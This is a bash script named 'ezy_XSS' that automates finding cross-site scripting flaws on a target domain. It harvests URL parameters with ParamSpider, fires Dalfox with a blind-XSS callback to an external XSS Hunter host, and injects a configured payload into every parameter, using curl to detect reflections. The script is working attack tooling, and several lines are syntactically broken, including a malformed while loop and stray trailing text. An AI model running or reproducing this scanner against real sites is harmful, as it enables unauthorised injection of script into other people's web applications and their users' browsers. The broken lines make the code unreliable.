
#!/bin/bash

green=`echo -en "\e[32m"`
blue=`echo -en "\e[34m"`
NC='\033[0m'
printf """
                       _  ____________
  ___  ____ __  __    | |/ / ___/ ___/
 / _ \/_  // / / /    |   /\__ \\__ \ 
/  __/ / // /_/ /    /   |___/ /__/ / 
\___/ /___|__, /____/_/|_/____/____/  
         /____/_____/             
         			 V-1.0___By e1Pr0f3ss0r                                                  


           
"""
domain=$1
. ~/ezy_xss/.config

while getopts ":d:" input;do
        case "$input" in
                d) domain=${OPTARG}
                        ;;
                esac
        done
if [ -z "$domain" ]     
        then
                echo "Please use \"-d target.com\""
                exit 1
fi



mkdir -p $domain
echo  "\n\n\n \e[1;33m Scanning For \e[5m\e[96mXSS_Parameters \e[25m\e[1;33mWait...\e[0m\n"


python3 ~/tools/ParamSpider/./paramspider.py --domain $domain | tee -a $domain/params.txt 

 

echo   "\n\n\n \e[1;33mUsing \e[5m\e[96mDalfox \e[25m\e[1;33mTake a Coffee\e[0m\n\n\n"

dalfox file  $domain/params.txt  -b $xsshunter_domain -o $domain/dalfox-xss.txt


cat $domain/params.txt|  grep 'FUZZ' | qsreplace "$xss_payload" | tee -a $domain/combinedfuzz.json && cat $domain/combinedfuzz.json | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "$xss_payload" && echo -e "$host \033[0;31mVulnerable\n" | tee -a $domain/Vuln-xss.txt \n\ name;done

echo "${green}Vulnerable XSS Links are stored in $domain/dalfox-xss.txt & $domain/Vuln-xss.txt ${NC}"	zz
